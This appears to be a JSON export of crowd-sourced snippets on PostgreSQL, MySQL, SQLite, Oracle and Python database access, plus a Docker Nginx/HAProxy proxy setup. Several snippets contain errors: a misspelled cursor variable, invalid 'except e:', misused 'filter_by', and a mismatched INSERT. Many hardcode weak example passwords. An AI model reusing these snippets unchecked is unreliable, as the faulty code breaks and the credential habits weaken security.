    "description": "# Nginx conf events {}  stream {   upstream postgres {     server pdb:5432;   }   server {     listen 5432;     proxy_pass postgres;   } } ############### # haproxy conf global   log 127.0.0.1   local1   maxconn 4096  defaults   mode http   maxconn 2048  frontend postgresDB   bind *:5000   mode tcp   timeout connect 5s   timeout client 5s   timeout server 5s   default_backend postgresDB  backend postgresDB   mode tcp   server pdb pdb:5432  check inter 5s rise 2 fall 3    ##############    ############  # Containers Deployment sudo docker run -d --name testdb 'POSTGRES_PASSWORD=123456' postgres  sudo docker run -d --name pdb  -e 'POSTGRES_USER=admin' -e 'POSTGRES_DB=testdb' -e 'POSTGRES_PASSWORD=admin123456' postgres  sudo docker run -d --name nginx-TCPreverseProxy  -p 5432:5432  --link pdb:pdb -v /home/admin/nginx.conf:/etc/nginx/nginx.conf nginx  sudo docker run -d -p 5000:5000 --name haproxy --link pdb:pdb -v /home/admin/haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg haproxy  #Testing of connection sudo docker exec -it -u 0 testdb bash  #Inside test postgres container #checking connection through nginx-proxy root@34211600c3f7:/#  psql -h 192.168.0.2 -p 5432 -d testdb -U admin -W  #checking connection through haproxy-proxy root@34211600c3f7:/#  psql -h 192.168.0.2 -p 5000 -d testdb -U admin -W\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3356,
    "keyword": null,
    "link": null,
    "title": " psql autocomplete for mac brew install",
    "description": "$ brew install pgcli \n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3357,
    "keyword": null,
    "link": null,
    "title": " psql check if value in array",
    "description": "SELECT value_variable = ANY(array)\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3358,
    "keyword": null,
    "link": null,
    "title": " psql client write to bash variable",
    "description": "vartest=`psql -X -A -d $dbname -U $username -h localhost -p 5432 -t -c \"SELECT gid FROM testtable WHERE aid='1'\"` \n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3359,
    "keyword": null,
    "link": null,
    "title": " psql command not found windows",
    "description": "Assuming you installed PostgreSQL on Windows with the PostgreSQL \"One-click\" installer packaged by EnterpriseDB, psql is not added to the PATH automatically. That's partly because adding it to the path could otherwise cause confusion when people have multiple versions of PostgreSQL installed.  You need to specify the full explicit path to psql, eg:  \"%PROGRAMFILES%\\Postgresql\\9.2\\bin\\psql.exe\" or add psql to the user PATH environment variable, see eg this guide.\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3360,
    "keyword": null,
    "link": null,
    "title": " psql connect",
    "description": "psql -d gpdatabase -h master_host -p 5432 -U gpadmin\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3361,
    "keyword": null,
    "link": null,
    "title": " psql connect to another database",
    "description": "\\c DBNAME \\connect DBNAME\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3362,
    "keyword": null,
    "link": null,
    "title": " psql connections",
    "description": "SELECT * FROM pg_stat_activity;\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3363,
    "keyword": null,
    "link": null,
    "title": " psql create database",
    "description": "sudo -u postgres psql postgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\nCREATE DATABASE dbname; \ncreatedb -h localhost -p 5432 -U postgres testdb password ******\ncreatedb sammy \n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3364,
    "keyword": null,
    "link": null,
    "title": " psql create table foreign keys",
    "description": "# id_user is the primary key of the table users: create table lists( id_list serial not null primary key, id_user int references users(id_user), is_temp int );\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3365,
    "keyword": null,
    "link": null,
    "title": " psql create user",
    "description": "sudo -u postgres psql postgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\nCREATE DATABASE yourdbname;CREATE USER youruser WITH ENCRYPTED PASSWORD 'yourpass';GRANT ALL PRIVILEGES ON DATABASE yourdbname TO youruser;\n# https://www.postgresql.org/docs/8.0/sql-createuser.html CREATE USER <username> WITH PASSWORD '<password>' VALID UNTIL '<date here>';\nCREATE USER visualscrapy WITH PASSWORD '123456'; # it will create the new user in postgres\nCREATE USER jonathan; CREATE USER davide WITH PASSWORD 'jw8s0F4'; CREATE USER miriam WITH PASSWORD 'jw8s0F4' VALID UNTIL '2005-01-01'; CREATE USER manuel WITH PASSWORD 'jw8s0F4' CREATEDB;\npsql=# grant all privileges on database <dbname> to <username>\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3366,
    "keyword": null,
    "link": null,
    "title": " psql datetime grather than",
    "description": "SELECT * FROM table WHERE update_date >= '2013-05-03'::date AND update_date < ('2013-05-03'::date + '1 day'::interval);\n",
    "reg_date": "2021-10-12T09:59:18.000Z"
  },
  {
    "id": 3367,
    "keyword": null,
    "link": null,
    "title": " psql drop column",
    "description": "ALTER TABLE table_name  DROP COLUMN column_name;\nALTER TABLE table_name DROP COLUMN column_name\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3368,
    "keyword": null,
    "link": null,
    "title": " psql drop field",
    "description": "ALTER TABLE table_name DROP COLUMN column_name;\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3369,
    "keyword": null,
    "link": null,
    "title": " psql execute sql file",
    "description": "db=> \\i my_script.sql\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3370,
    "keyword": null,
    "link": null,
    "title": " psql fatal database does not exist",
    "description": "# So you do not have to create a database with your role name  psql -U Username DatabaseName  \nIt appears that your package manager failed to create the database named $user for you. The reason that  psql -d template1 works for you is that template1 is a database created by postgres itself, and is present on all installations. You are apparently able to log in to template1, so you must have some rights assigned to you by the database. Try this at a shell prompt:  createdb and then see if you can log in again with  psql -h localhost\npsql -d template1 \n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3371,
    "keyword": null,
    "link": null,
    "title": " psql filed name alter",
    "description": "ALTER TABLE table_name  RENAME column_name TO new_column_name;\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3372,
    "keyword": null,
    "link": null,
    "title": " psql get sequences",
    "description": "# Get all sequences SELECT c.relname FROM pg_class c WHERE c.relkind = 'S';  # Get last value of a sequence SELECT last_value FROM test_id_seq;\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3373,
    "keyword": null,
    "link": null,
    "title": " psql join",
    "description": "SELECT *     FROM weather INNER JOIN cities ON (weather.city = cities.name); \n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3374,
    "keyword": null,
    "link": null,
    "title": " psql kill pid",
    "description": "select pg_terminate_backend(pid)  from pg_stat_activity  where pid = '18765';\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3375,
    "keyword": null,
    "link": null,
    "title": " psql list rules",
    "description": "select n.nspname as rule_schema,         c.relname as rule_table,         case r.ev_type            when '1' then 'SELECT'           when '2' then 'UPDATE'           when '3' then 'INSERT'           when '4' then 'DELETE'           else 'UNKNOWN'         end as rule_event from pg_rewrite r     join pg_class c on r.ev_class = c.oid    left join pg_namespace n on n.oid = c.relnamespace    left join pg_description d on r.oid = d.objoid ;\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3376,
    "keyword": null,
    "link": null,
    "title": " psql list tables in schema",
    "description": "=> \\dt *.* \n=> \\dt public.* \n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3377,
    "keyword": null,
    "link": null,
    "title": " psql load dump",
    "description": "pg_dump dbname > outfile\npsql databasename < data_base_dump\n",
    "reg_date": "2021-10-12T09:59:19.000Z"
  },
  {
    "id": 3378,
    "keyword": null,
    "link": null,
    "title": " psql lst trigger",
    "description": "select event_object_schema as table_schema,        event_object_table as table_name,        trigger_schema,        trigger_name,        string_agg(event_manipulation, ',') as event,        action_timing as activation,        action_condition as condition,        action_statement as definition from information_schema.triggers group by 1,2,3,4,6,7,8 order by table_schema,          table_name; Code has been copied\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3379,
    "keyword": null,
    "link": null,
    "title": " psql select * from table",
    "description": "select * from public.Graeber \n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3380,
    "keyword": null,
    "link": null,
    "title": " psql select unique",
    "description": "SELECT    DISTINCT column1 FROM    table_name;\nSelect Distinct On (u.username, u.email)      u.username     ,u.email     ,l.browser     ,l.login_time From users u Join logins l On l.username = u.username Order By u.username, u.email, login_time Desc                                           ^ \n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3381,
    "keyword": null,
    "link": null,
    "title": " psql set access privileges",
    "description": "REVOKE ALL ON DATABASE example_database FROM example_user; GRANT CONNECT ON DATABASE example_database TO example_user; GRANT SELECT ON ALL TABLES IN SCHEMA public TO example_user;\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3382,
    "keyword": null,
    "link": null,
    "title": " psql show columns of table",
    "description": "SELECT     table_name,     column_name,     data_type  FROM     information_schema.columns WHERE     table_name = 'city';Code language: SQL (Structured Query Language) (sql)\n                                     SELECT     table_name,     column_name,     data_type  FROM     information_schema.columns WHERE     table_name = 'city';\npostgres=# \\d tablename;\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3383,
    "keyword": null,
    "link": null,
    "title": " psql show with user is logged in",
    "description": "\\conninfo\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3384,
    "keyword": null,
    "link": null,
    "title": " psql view enum values",
    "description": "SELECT enum_range(NULL::myenum);\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3385,
    "keyword": null,
    "link": null,
    "title": " purge undo tablespace oracle 11g",
    "description": "-- UNDO tablespace current usage / available space SELECT a.TABLESPACE_NAME, SIZEMB, USAGEMB, (SIZEMB - USAGEMB) AS FREEMB FROM (SELECT round(sum(BYTES) / 1e6) AS SIZEMB, b.TABLESPACE_NAME       FROM DBA_DATA_FILES a, DBA_TABLESPACES b       WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME AND b.CONTENTS LIKE 'UNDO'       GROUP BY b.TABLESPACE_NAME) a,      (SELECT c.TABLESPACE_NAME, sum(BYTES) / 1e6 AS USAGEMB       FROM DBA_UNDO_EXTENTS c       WHERE STATUS <> 'EXPIRED'       GROUP BY c.TABLESPACE_NAME) b WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME;\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3386,
    "keyword": null,
    "link": null,
    "title": " purge undo tablespace usage",
    "description": "-- UNDO tablespace current usage / available space SELECT a.TABLESPACE_NAME, SIZEMB, USAGEMB, (SIZEMB - USAGEMB) AS FREEMB FROM (SELECT round(sum(BYTES) / 1e6) AS SIZEMB, b.TABLESPACE_NAME       FROM DBA_DATA_FILES a, DBA_TABLESPACES b       WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME AND b.CONTENTS LIKE 'UNDO'       GROUP BY b.TABLESPACE_NAME) a,      (SELECT c.TABLESPACE_NAME, sum(BYTES) / 1e6 AS USAGEMB       FROM DBA_UNDO_EXTENTS c       WHERE STATUS <> 'EXPIRED'       GROUP BY c.TABLESPACE_NAME) b WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME;\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3387,
    "keyword": null,
    "link": null,
    "title": " pv mysql import",
    "description": "pv sqlfile.sql | mysql -uxxx -pxxxx dbname\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3388,
    "keyword": null,
    "link": null,
    "title": " pyodbc connect to sql server",
    "description": "import pyodbc  # Some other example server values are # server = 'localhost\\sqlexpress' # for a named instance # server = 'myserver,port' # to specify an alternate port server = 'tcp:myserver.database.windows.net'  database = 'mydb'  username = 'myusername'  password = 'mypassword'  cnxn = pyodbc.connect('DRIVER={ODBC Driver 17 for SQL Server};SERVER='+server+';DATABASE='+database+';UID='+username+';PWD='+ password) cursor = cnxn.cursor()\nwith pyodbc.connect(conx_string) as conx:     cursor = conx.cursor()     cursor.execute(query)     data = cursor.fetchall()     \nconn = pyodbc.connect('DRIVER={ODBC Driver 17 for SQL Server};SERVER=test;DATABASE=test;UID=user;PWD=password')\n",
    "reg_date": "2021-10-12T09:59:20.000Z"
  },
  {
    "id": 3389,
    "keyword": null,
    "link": null,
    "title": " pyodbc insert csv",
    "description": "import pandas as pd import pyodbc  # Import CSV data = pd.read_csv (r'C:\\Users\\Ron\\Desktop\\Test\\People.csv')    df = pd.DataFrame(data, columns= ['Name','Country','Age'])  # Connect to SQL Server conn = pyodbc.connect('Driver={SQL Server};'                       'Server=RON\\SQLEXPRESS;'                       'Database=TestDB;'                       'Trusted_Connection=yes;') cursor = conn.cursor()  # Create Table cursor.execute('CREATE TABLE people_info (Name nvarchar(50), Country nvarchar(50), Age int)')  # Insert DataFrame to Table for row in df.itertuples():     cursor.execute('''                 INSERT INTO TestDB.dbo.people_info (Name, Country, Age)                 VALUES (?,?,?)                 ''',                 row.Name,                  row.Country,                 row.Age                 ) conn.commit() \n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3390,
    "keyword": null,
    "link": null,
    "title": " python3 mysql database access",
    "description": "#!/usr/bin/python3  import pymysql  # Open database connection db = pymysql.connect(\"localhost\",\"testuser\",\"test123\",\"TESTDB\" )  # prepare a cursor object using cursor() method cursor = db.cursor()  # Drop table if it already exist using execute() method. cursor.execute(\"DROP TABLE IF EXISTS EMPLOYEE\")  # Create table as per requirement sql = \"\"\"CREATE TABLE EMPLOYEE (    FIRST_NAME  CHAR(20) NOT NULL,    LAST_NAME  CHAR(20),    AGE INT,      SEX CHAR(1),    INCOME FLOAT )\"\"\"  cursor.execute(sql)  # disconnect from server db.close()\n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3391,
    "keyword": null,
    "link": null,
    "title": " python and mysql connectivity",
    "description": "import mysql.connector mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\",   port = 8888, #for Mamp users   database='whatever db you want' ) print(mydb) \nimport pymysql  ############### CONFIGURE THIS ################### # Open database connection db = pymysql.connect(\"database_host\",\"username\",\"password\",\"database_name\") ##################################################  # prepare a cursor object using cursor() method cursor = db.cursor()  # execute SQL query using execute() method. cursor.execute(\"SELECT VERSION()\")  # Fetch a single row using fetchone() method. data = cursor.fetchone() print (\"Database version : {0}\".format(data))  # disconnect from server db.close()\nfrom sqlalchemy import types, create_engine import pymysql  try: \tconn = create_engine('mysql+pymysql://user:pass@IP/database_name')   \tprint(\"MySQL Connection Sucessfull!!!!!!!!!!!\")  except Exception as err:  \tprint(\"MySQL Connection Failed !!!!!!!!!!!\") \tprint(err) \n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3392,
    "keyword": null,
    "link": null,
    "title": " python escape string for sql",
    "description": "conn.escape_string() \n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3393,
    "keyword": null,
    "link": null,
    "title": " python mysql",
    "description": "pip install mysql-connector\n# real nice guide, as well as instalation guide: https://pynative.com/python-mysql-database-connection/ # pip install mysql-connector-python import mysql.connector from mysql.connector import Error  try:     connection = mysql.connector.connect(host='localhost',                                          database='Electronics',                                          user='pynative',                                          password='pynative@#29')     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record)  except Error as e:     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\nimport mysql.connector  cnx = mysql.connector.connect(user='scott', password='password',                               host='127.0.0.1',                               database='employees') cnx.close()\nimport mysql.connector mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\",   port = 8888, #for Mamp users   database='whatever db you want' ) print(mydb) \n C:\\Users\\Your Name\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts>python -m pip install    mysql-connector-python \n#!/usr/bin/python3  import pymysql  # Open database connection db = pymysql.connect(\"localhost\",\"testuser\",\"test123\",\"TESTDB\" )  # prepare a cursor object using cursor() method cursor = db.cursor()  # Drop table if it already exist using execute() method. cursor.execute(\"DROP TABLE IF EXISTS EMPLOYEE\")  # Create table as per requirement sql = \"\"\"CREATE TABLE EMPLOYEE (    FIRST_NAME  CHAR(20) NOT NULL,    LAST_NAME  CHAR(20),    AGE INT,      SEX CHAR(1),    INCOME FLOAT )\"\"\"  cursor.execute(sql)  # disconnect from server db.close()\n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3394,
    "keyword": null,
    "link": null,
    "title": " python mysql check if database exists",
    "description": "CREATE DATABASE IF NOT EXISTS DBName; \n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3395,
    "keyword": null,
    "link": null,
    "title": " python mysql connector",
    "description": "pip3 install mysql-connector-python  #Python 3 pip install mysql-connector-python \n# real nice guide, as well as instalation guide: https://pynative.com/python-mysql-database-connection/ # pip install mysql-connector-python import mysql.connector from mysql.connector import Error  try:     connection = mysql.connector.connect(host='localhost',                                          database='Electronics',                                          user='pynative',                                          password='pynative@#29')     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record)  except Error as e:     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\nimport mysql.connector  cnx = mysql.connector.connect(user='scott', password='password',                               host='127.0.0.1',                               database='employees') cnx.close()\nimport mysql.connector  mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\" )  print(mydb)\nPress CTRL+C to copy import datetime import mysql.connector  cnx = mysql.connector.connect(user='scott', database='employees') cursor = cnx.cursor()  query = (\"SELECT first_name, last_name, hire_date FROM employees \"          \"WHERE hire_date BETWEEN %s AND %s\")  hire_start = datetime.date(1999, 1, 1) hire_end = datetime.date(1999, 12, 31)  cursor.execute(query, (hire_start, hire_end))  for (first_name, last_name, hire_date) in cursor:   print(\"{}, {} was hired on {:%d %b %Y}\".format(     last_name, first_name, hire_date))  cursor.close() cnx.close()\nimport mysql.connector try:     connection = mysql.connector.connect(host='localhost',database='dbname',user='root',password='xxxxx')     # print(dir(connection))     # print(connection.connection_id)     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record) except Error as e:     print(\"except\")     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3396,
    "keyword": null,
    "link": null,
    "title": " python mysql create table if not exists",
    "description": "                                     CREATE TABLE IF NOT EXISTS checklists (     todo_id INT AUTO_INCREMENT,     task_id INT,     todo VARCHAR(255) NOT NULL,     is_completed BOOLEAN NOT NULL DEFAULT FALSE,     PRIMARY KEY (todo_id , task_id),     FOREIGN KEY (task_id)         REFERENCES tasks (task_id)         ON UPDATE RESTRICT ON DELETE CASCADE );Code language: SQL (Structured Query Language) (sql)\nCREATE TABLE [IF NOT EXISTS] tbl_name     (create_definition,...)     [table_options]     [partition_options] \nCREATE TABLE [IF NOT EXISTS] table_name(    column_1_definition,    column_2_definition,    ...,    table_constraints ) ENGINE=storage_engine;\n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3397,
    "keyword": null,
    "link": null,
    "title": " python mysql query to dataframe",
    "description": "import mysql.connector import pandas as pd  db_connection = mysql.connector.connect(   host=\"localhost\",   user=\"user\",   password=\"password\",   database=\"dbname\",   auth_plugin='mysql_native_password' )  df = pd.read_sql(\"select * from table_name;\", con=db_connection) print(df) \nfrom sqlalchemy import create_engine import pymysql  db_connection_str = 'mysql+pymysql://mysql_user:mysql_password@mysql_host/mysql_db' db_connection = create_engine(db_connection_str)  df = pd.read_sql('SELECT * FROM table_name', con=db_connection)  # This works with \"mysql.connector\" as well\n",
    "reg_date": "2021-10-12T09:59:21.000Z"
  },
  {
    "id": 3398,
    "keyword": null,
    "link": null,
    "title": " python mysql show databases",
    "description": "import mysql.connector conn = mysql.connector.connect (user='user', password='password',                                host='server_address',buffered=True) cursor = conn.cursor() databases = (\"show databases\") cursor.execute(databases) for (databases) in cursor:      print databases[0] \n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3399,
    "keyword": null,
    "link": null,
    "title": " python simple connect to mysql",
    "description": "import mysql.connector mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\",   port = 8888, #for Mamp users   database='whatever db you want' ) print(mydb) \nimport pymysql.cursors import pymysql  # Connect to the database connection = pymysql.connect(host='localhost',                              user='user',                              password='passwd',                              db='db',                              charset='utf8mb4',                              cursorclass=pymysql.cursors.DictCursor)  try:     with connection.cursor() as cursor:         # Create a new record         sql = \"INSERT INTO `users` (`email`, `password`) VALUES (%s, %s)\"         cursor.execute(sql, ('webmaster@python.org', 'very-secret'))      # connection is not autocommit by default. So you must commit to save     # your changes.     connection.commit()      with connection.cursor() as cursor:         # Read a single record         sql = \"SELECT `id`, `password` FROM `users` WHERE `email`=%s\"         cursor.execute(sql, ('webmaster@python.org',))         result = cursor.fetchone()         print(result) finally:     connection.close() \n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3400,
    "keyword": null,
    "link": null,
    "title": " python sqlalchemy orm to select null values",
    "description": "from sqlalchemy import null session.query(models.<TABLE>).filter_by(<COLUMN>==null())\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3401,
    "keyword": null,
    "link": null,
    "title": " python sqlite",
    "description": "import sqlite3 conn = sqlite3.connect('example.db') c = conn.cursor()  # Create table c.execute('''CREATE TABLE stocks              (date text, trans text, symbol text, qty real, price real)''')  # Insert a row of data c.execute(\"INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)\")  # Save (commit) the changes conn.commit()  # We can also close the connection if we are done with it. # Just be sure any changes have been committed or they will be lost. conn.close()\npip install pysqlite3 \nimport sqlite3  # Create database conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute('''CREATE TABLE tablename(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, number REAL)''') conn.commit() conn.close()  # Insert Values conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute(\"INSERT INTO tablename VALUES (?, ?)\", (name, number)) conn.commit() conn.close()  # Read Values conn = sqlite3.connect('tablename.db') c = conn.cursor()  for row in c.execute('SELECT * FROM tablename'): \tprint(row)  number = [row[2] for row in c.execute('SELECT * FROM tablename')] conn.close()\npip install db-sqlite3\npip install sqlite\nimport sqlite3  con = sqlite3.connect(\":memory:\") con.isolation_level = None cur = con.cursor()  buffer = \"\"  print(\"Enter your SQL commands to execute in sqlite3.\") print(\"Enter a blank line to exit.\")  while True:     line = input()     if line == \"\":         break     buffer += line     if sqlite3.complete_statement(buffer):         try:             buffer = buffer.strip()             cur.execute(buffer)              if buffer.lstrip().upper().startswith(\"SELECT\"):                 print(cur.fetchall())         except sqlite3.Error as e:             print(\"An error occurred:\", e.args[0])         buffer = \"\"  con.close()\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3402,
    "keyword": null,
    "link": null,
    "title": " python sqlite3 create table if not exists",
    "description": "CREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...); \nCREATE TABLE IF NOT EXISTS [schema_name].table_name (...);\nCREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...);\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3403,
    "keyword": null,
    "link": null,
    "title": " python sqlite3 database",
    "description": "pip install pysqlite3 \nimport sqlite3  # Create database conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute('''CREATE TABLE tablename(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, number REAL)''') conn.commit() conn.close()  # Insert Values conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute(\"INSERT INTO tablename VALUES (?, ?)\", (name, number)) conn.commit() conn.close()  # Read Values conn = sqlite3.connect('tablename.db') c = conn.cursor()  for row in c.execute('SELECT * FROM tablename'): \tprint(row)  number = [row[2] for row in c.execute('SELECT * FROM tablename')] conn.close()\npip install sqlite\nimport sqlite3 as lite  import sys    try:      con = lite.connect('products.db')      cur = con.cursor()          cur.execute(\"CREATE TABLE drinks(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      cur.execute(\"CREATE TABLE fruits(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      con.commit()                except e:      if con:          con.rollback()            print(\"Unexpected error %s:\" % e.args[0])      sys.exit(1)  finally:      if con:          con.close()  \n-- SQL examples ---------------------------------------------------------------------------------------------------  -- http://inf-schule-db.informatik.uni-kl.de/SQLterra1.php -------------------------------------------------------- -- https://www.inf-schule.de/information/datenbanksysteme/terra/relationaledb -------------------------------------- CREATE TABLE `land` (   `LNR` varchar(4) NOT NULL,   `Name` varchar(50) NOT NULL,   `Einwohner` decimal(20,2) DEFAULT NULL,   `Flaeche` int(11) DEFAULT NULL,   `Hauptstadt` varchar(30) DEFAULT NULL,   `Kontinent` varchar(15) DEFAULT NULL,   `KontinentFlaeche` int(11) DEFAULT NULL,   `KontinentEinwohner` int(11) NOT NULL ); -- ---------------------------------------------------------------------------------------------------------------- INSERT INTO `land` (`LNR`, `Name`, `Einwohner`, `Flaeche`, `Hauptstadt`, `Kontinent`, `KontinentFlaeche`, `KontinentEinwohner`) VALUES ('A', '&Ouml;sterreich', '8.51', 83879, 'Wien', 'Europa', 10, 733), ('AC', 'Antigua und Barbuda', '0.09', 443, 'Saint John s', 'Nordamerika', 24, 523), ('AF', 'Afghanistan', '33.40', 652230, 'Kabul', 'Asien', 44, 4010), ('AG', 'Algerien', '37.40', 2381741, 'Algiers', 'Afrika', 30, 944), ('AL', 'Albanien', '2.80', 28748, 'Tirana', 'Europa', 10, 733); -- ---------------------------------------------------------------------------------------------------------------- CREATE TABLE `ort` (   `Name` varchar(30) DEFAULT NULL,   `Land` varchar(50) NOT NULL,   `Einwohner` int(11) DEFAULT NULL,   `Laenge` decimal(10,4) DEFAULT NULL,   `Breite` decimal(10,4) DEFAULT NULL ); -- ---------------------------------------------------------------------------------------------------------------- INSERT INTO `ort` (`Name`, `Land`, `Einwohner`, `Laenge`, `Breite`) VALUES ('Kabul', 'Afghanistan', 1400000, '69.0000', '34.0000'), ('Kandahar', 'Afghanistan', 323900, '65.0000', '31.0000'), ('Masar-e Scharif', 'Afghanistan', 250000, '67.0000', '36.0000'), ('Abnub', '&Auml;gypten', 70791, '31.1500', '27.2700'), ('Abo el Matamer', '&Auml;gypten', 47432, '30.1800', '30.9200'); -- ---------------------------------------------------------------------------------------------------------------- SELECT name, einwohner, hauptstadt   FROM land ORDER BY einwohner DESC -- ---------------------------------------------------------------------------------------------------------------- SELECT name   FROM land WHERE kontinent='europa' -- ---------------------------------------------------------------------------------------------------------------- SELECT name, einwohner   FROM land WHERE einwohner>=10 and einwohner<=100 ORDER BY einwohner DESC -- ---------------------------------------------------------------------------------------------------------------- SELECT name, hauptstadt   FROM land WHERE name LIKE '%Arm%' or name LIKE '%Bein%' -- ---------------------------------------------------------------------------------------------------------------- SELECT name, laenge   FROM ort WHERE land='Deutschland' and laenge<7.768 -- ---------------------------------------------------------------------------------------------------------------- SELECT name, hauptstadt, kontinent   FROM land WHERE kontinent IN ('Asien','Australien')  -- https://www.youtube.com/watch?v=91iNR0eG8kE -------------------------------------------------------------------- import mysql.connector db = mysql.connector.connect( \thost=\"localhost\", \tuser=\"root\", \tpasswd=\"root\", \tdatabase=\"testdatabase\" \t) mycurser = db.cursor() mycursor.execute(\"CREATE TABLE Person (name VARCHAR(50), age smallint UNSIGNED, personID int PRIMARY KEY AUTO_INCREMENT)\") mycursor.execute(\"DESCRIBE Person\") mycursor.execute(\"INSERT INTO Person (name, age) VALUES ('tech with tim', 45)\") mycursor.execute(\"SELECT * FROM Person\") -- https://www.youtube.com/watch?v=kUBGiABFFHc -------------------------------------------------------------------- import mysql.connector from datetime import datetime db = mysql.connector.connect( \thost=\"localhost\", \tuser=\"root\", \tpasswd=\"root\", \tdatabase=\"testdatabase\" \t) mycursor = db.cursor() mycursor.execute(\"CREATE TABLE Test (name varchar(50) NOT NULL, created datetime NOT NULL, gender ENUM('M', 'F', 'O'), id int PRIMARY KEY NOT NULL AUTO_INCREMENT)\") mycursor.execute(\"INSERT INTO Test (name, created, gender) VALUES (?,?,?)\", ('Tim', datetime.now(), 'M')) mycursor.execute(\"SELECT * FROM Test WHERE gender = 'M' ORDER BY id DESC\") mycursor.execute(\"ALTER TABLE Test ADD COLUMN food VARCHAR(50) NOT NULL\") mycursor.execute(\"DESCRIBE Test\") 